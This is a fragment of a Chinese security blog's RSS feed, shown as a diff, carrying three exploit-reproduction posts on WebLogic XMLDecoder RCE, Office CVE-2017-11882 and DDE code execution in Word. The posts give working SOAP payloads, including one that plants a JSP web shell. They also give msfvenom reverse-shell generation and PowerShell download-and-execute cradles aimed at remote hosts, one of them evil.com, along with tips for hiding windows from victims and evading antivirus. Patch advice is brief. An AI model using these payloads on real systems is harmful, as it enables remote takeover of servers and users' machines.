+	&amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
+		&amp;lt;java version=&amp;quot;1.8.0_131&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+		  &amp;lt;void class=&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;
+			&amp;lt;array class=&amp;quot;java.lang.String&amp;quot; length=&amp;quot;3&amp;quot;&amp;gt;
+			  &amp;lt;void index=&amp;quot;0&amp;quot;&amp;gt;
+				&amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt;
+			  &amp;lt;/void&amp;gt;
+			  &amp;lt;void index=&amp;quot;1&amp;quot;&amp;gt;
+				&amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
+			  &amp;lt;/void&amp;gt;
+			  &amp;lt;void index=&amp;quot;2&amp;quot;&amp;gt;
+				&amp;lt;string&amp;gt;calc&amp;lt;/string&amp;gt;
+			  &amp;lt;/void&amp;gt;
+			&amp;lt;/array&amp;gt;
+		  &amp;lt;void method=&amp;quot;start&amp;quot;/&amp;gt;&amp;lt;/void&amp;gt;
+		&amp;lt;/java&amp;gt;
+	  &amp;lt;/work:WorkContext&amp;gt;
+	&amp;lt;/soapenv:Header&amp;gt;
+  &amp;lt;soapenv:Body/&amp;gt;
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;向&lt;code&gt;/wls-wsat/CoordinatorPortType&lt;/code&gt;发起一个POST请求，body部分为上面的内容，&lt;strong&gt;修改&lt;code&gt;Content-Type&lt;/code&gt;为&lt;code&gt;text/xml&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;目前了解的uri还有&lt;code&gt;CoordinatorPortType11&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;服务器返回&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;faultcode&amp;gt;S:Server&amp;lt;/faultcode&amp;gt;
+&amp;lt;faultstring&amp;gt;0&amp;lt;/faultstring&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;说明执行成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/yn2qT&#34; alt=&#34;response&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/YOZ6L&#34; alt=&#34;reverse shell&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x03-getshell&#34;&gt;0x03 Getshell&lt;/h4&gt;
+
+&lt;p&gt;另外还有直接getshell的PoC:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soapenv:Header&amp;gt;
+    &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
+        &amp;lt;java&amp;gt;&amp;lt;java version=&amp;quot;1.4.0&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+            &amp;lt;object class=&amp;quot;java.io.PrintWriter&amp;quot;&amp;gt;
+                &amp;lt;string&amp;gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp&amp;lt;/string&amp;gt;&amp;lt;void method=&amp;quot;println&amp;quot;&amp;gt;
+                    &amp;lt;string&amp;gt;&amp;lt;![CDATA[&amp;lt;%if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){  
+                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;i&amp;quot;)).getInputStream();  
+                        int a = -1;  
+                        byte[] b = new byte[2048];  
+                        out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);  
+                        while((a=in.read(b))!=-1){  
+                            out.println(new String(b));  
+                        }  
+                        out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);} %&amp;gt;]]&amp;gt;&amp;lt;/string&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;void method=&amp;quot;close&amp;quot;/&amp;gt;
+            &amp;lt;/object&amp;gt;
+        &amp;lt;/java&amp;gt;
+      &amp;lt;/java&amp;gt;
+    &amp;lt;/work:WorkContext&amp;gt;
+  &amp;lt;/soapenv:Header&amp;gt;
+&amp;lt;soapenv:Body/&amp;gt;
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;会在&lt;code&gt;tmp/_WL_internal&lt;/code&gt;下&lt;code&gt;bea_wls9_async_response&lt;/code&gt;、&lt;code&gt;bea_wls_internal&lt;/code&gt;和&lt;code&gt;uddiexplorer&lt;/code&gt;目录中的war包下创建a.jsp文件，具体路径可自己选择，对应的web路径是&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://x.x.x.x:7001/bea_wls_internal/a.jsp&lt;/code&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x04-rmi-利用&#34;&gt;0x04 RMI 利用&lt;/h4&gt;
+
+&lt;p&gt;导师还给出了rmi调用执行的方式，可惜我对rmi机制还没研究透彻，没有构造出来利用的流程，先把PoC放在这儿:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    &amp;lt;java version=&amp;quot;1.8.0_131&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
+    &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
+    &amp;lt;string&amp;gt;rmi://localhost:1099/Exploit&amp;lt;/string&amp;gt;
+    &amp;lt;/void&amp;gt;
+    &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
+    &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
+    &amp;lt;/void&amp;gt;
+    &amp;lt;/void&amp;gt;
+    &amp;lt;/java&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;更新：研究了一下rmi利用，更新在了&lt;a href=&#34;https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;目前看到PoC的变换还有好几种，甚至出现了绕过官方补丁的版本，后续应该会逐渐放出的。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x05-修补方案&#34;&gt;0x05 修补方案&lt;/h4&gt;
+
+&lt;p&gt;1.安装Oracle 10月份最新补丁&lt;/p&gt;
+
+&lt;p&gt;2.删除或重命名WebLogic目录中以下war包及目录&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
+rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
+rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;访问&lt;code&gt;wls-wsat&lt;/code&gt;响应404即可&lt;/p&gt;
+
+&lt;h4 id=&#34;0x06&#34;&gt;0x06&lt;/h4&gt;
+
+&lt;p&gt;附
+Github上&lt;a href=&#34;https://github.com/3xp10it/exploit/blob/cbc8d61859b9c4c312bb52225671831b895fdbc3/exps/weblogic/weblogic.py&#34;&gt;3xp10it/exploit&lt;/a&gt;仓库删除的脚本
+&lt;a href=&#34;https://ob5vt1k7f.qnssl.com/weblogic.py&#34;&gt;Weblogic.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CVE-2017-11882 复现</title>
+      <link>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Tue, 21 Nov 2017 18:40:29 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;上周微软更新日，修复了&lt;code&gt;CVE-2017-11882&lt;/code&gt;这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做&lt;code&gt;EQNEDT32.EXE&lt;/code&gt;，在win10上的路径是&lt;code&gt;C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE&lt;/code&gt;，可以在编辑文档的时候插入公式。&lt;/p&gt;
+
+&lt;p&gt;最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下&lt;/p&gt;
+
+&lt;p&gt;下载&lt;code&gt;https://github.com/Ridter/CVE-2017-11882/&lt;/code&gt;利用脚本，该脚本是&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;@Evi1cg&lt;/a&gt;改造后的脚本，经过测试效果还是不错的&lt;/p&gt;
+
+&lt;p&gt;生成一个测试文档的话执行
+&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;cmd.exe /c calc.exe&amp;quot; -o test.doc
+&lt;/code&gt;
+打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前&lt;a href=&#34;https://kylingit.com/blog/msword-code-exec-without-macro/&#34;&gt;不带宏的代码执行&lt;/a&gt;要简单粗暴&lt;/p&gt;
+
+&lt;p&gt;注意一点的是命令部分长度不能超过43bytes&lt;/p&gt;
+
+&lt;h4 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h4&gt;
+
+&lt;p&gt;下面主要讲一下反弹shell的利用&lt;/p&gt;
+
+&lt;p&gt;用mshta方式执行代码：
+在vps上建立一个文件&lt;code&gt;test&lt;/code&gt;，内容为&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;HTML&amp;gt; 
+&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;
+&amp;lt;HEAD&amp;gt; 
+&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
+Set objShell = CreateObject(&amp;quot;Wscript.Shell&amp;quot;)
+objShell.Run &amp;quot;calc.exe&amp;quot;
+self.close
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;
+demo
+&amp;lt;/body&amp;gt;
+&amp;lt;/HEAD&amp;gt; 
+&amp;lt;/HTML&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;关键是修改&lt;code&gt;objShell.Run&lt;/code&gt;后面的部分&lt;/p&gt;
+
+&lt;p&gt;我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：&lt;/p&gt;
+
+&lt;p&gt;修改&lt;code&gt;objShell.Run&lt;/code&gt;为&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ip/reverse.ps1&#39;);reverse.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;其中&lt;code&gt;reverse.ps1&lt;/code&gt;通过&lt;code&gt;msfvenom&lt;/code&gt;生成:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;reverse.ps1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;msf开启监听，然后生成word文档：
+&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;mshta http://ip/test&amp;quot; -o test.doc&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;打开之后就会收到shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/5TU1y&#34; alt=&#34;test&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KM1My&#34; alt=&#34;session 1&#34; /&gt;
+但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以&lt;code&gt;-WindowStyle Hidden&lt;/code&gt;的方式运行了，那怎么绕过这个黑框呢？&lt;/p&gt;
+
+&lt;p&gt;查一下&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx&#34;&gt;文档&lt;/a&gt;
+可以看到&lt;code&gt;Run&lt;/code&gt;命令是可以通过&lt;code&gt;intWindowStyle&lt;/code&gt;参数来控制窗口风格的，有0-10这几种风格
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/q0F4b&#34; alt=&#34;Run Method&#34; /&gt;
+所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/ccxgV&#34; alt=&#34;0&#34; /&gt;
+经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/qJKq7&#34; alt=&#34;session 3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fzUuw&#34; alt=&#34;av&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>MSWord Code Exec Without Macro</title>
+      <link>https://kylingit.com/blog/msword-code-exec-without-macro/</link>
+      <pubDate>Thu, 12 Oct 2017 12:54:29 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/msword-code-exec-without-macro/</guid>
+      <description>&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;昨天复现了一个 Microsoft Office Word 的一个执行任意代码的姿势，跟之前爆出的两个CVE (CVE-2017-0199, CVE-2017-8759) 可以组成三板斧，这里简单记录一下&lt;/p&gt;
+
+&lt;p&gt;在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是 bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在 word 里同步更新其它应用的内容，比如说在一个 word文档里引用了另一个excel表格里的某项内容，通过连接域 (Field) 的方式可以实现在 excel 里更新内容后 word 中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，&lt;code&gt;ctrl+f9&lt;/code&gt;插入一个域，在&lt;code&gt;{}&lt;/code&gt;之间写入代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;{ DDEAUTO c:\\windows\\system32\\cmd.exe &amp;quot;/k calc.exe&amp;quot; }&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;或者&lt;code&gt;插入-文档部件-域&lt;/code&gt;，选择第一个&lt;code&gt;= (Formula)&lt;/code&gt;
+然后右键&lt;code&gt;切换域代码&lt;/code&gt;来编辑代码，插入上面的内容&lt;/p&gt;
+
+&lt;p&gt;这样子可以直接弹出计算器&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/GIF.gif&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;既然能执行cmd那就能弹shell&lt;/p&gt;
+
+&lt;p&gt;在msf里生成一个ps脚本：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;xxx.ps1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;在msf里监听&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/HQ%5D%25%7DB5TLH~HBZD%7B1_%7B$D%254.png&#34; alt=&#34;msf&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后开启一个服务器&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;远程下载ps脚本后执行&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://x.x.x.x/xxx.ps1&#39;);xxx.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;打开文件后反弹一个shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/MPI@%5B%60%25DL%28U7WZL220E0%5B7Q.jpg&#34; alt=&#34;shell&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;过程很简单，唯一不足的是打开文件过程中会有两次弹窗，第一次是询问是否更新链接，第二个是问是否执行程序，当两个都点击确认后才会执行。&lt;/p&gt;
+
+&lt;p&gt;作者给出的命令是
+&lt;code&gt;{ DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(&#39;http://evil.com/evil.ps1&#39;);powershell -e $e &amp;quot;}&lt;/code&gt;
+但是自己尝试了并没有成功，于是修改成上面的命令，测试成功，并且不会报毒&lt;/p&gt;
+
+&lt;p&gt;除了上面使用的&lt;code&gt;DDEAUTO&lt;/code&gt;，&lt;code&gt;DDE&lt;/code&gt;也有能实现这个效果，但是要多一个步骤
+将文件后缀改为&lt;code&gt;zip&lt;/code&gt;或&lt;code&gt;rar&lt;/code&gt;，用&lt;code&gt;7z&lt;/code&gt;打开，修改&lt;code&gt;word/settings.xml&lt;/code&gt;文件，增加一行&lt;code&gt;&amp;lt;w:updateFields w:val=&amp;quot;true&amp;quot;/&amp;gt;&lt;/code&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/6U0%25213Q8W%7BEOM%7BJ_V@7%29G7.png&#34; alt=&#34;&#34; /&gt;
+替换原来的&lt;code&gt;xml&lt;/code&gt;文件后把后缀改回来&lt;/p&gt;
+
+&lt;p&gt;编辑文档，域代码为&lt;code&gt;{ DDE &amp;quot;c:\\windows\\system32\\cmd.exe&amp;quot; &amp;quot;/c notepad&amp;quot; }&lt;/code&gt;
+效果跟上面一样&lt;/p&gt;
+
+&lt;p&gt;类似方法除了上面两个外还有&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GLOSSARY
+IMPORT
+INCLUDE
+SHAPE
+DISPLAYBARCODE
+MERGEBARCODE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;参考微软文档 &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;目前不清楚这些方法有没有影响，微软认为并没有必要去修复这个“漏洞”&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Microsoft responded that as suggested it is a feature and no further action will be taken, and will be considered for a next-version candidate bug.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;最近 office 漏洞频发，建议不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁&lt;/p&gt;
+
+&lt;p&gt;参考：
+&lt;a href=&#34;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&#34;&gt;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
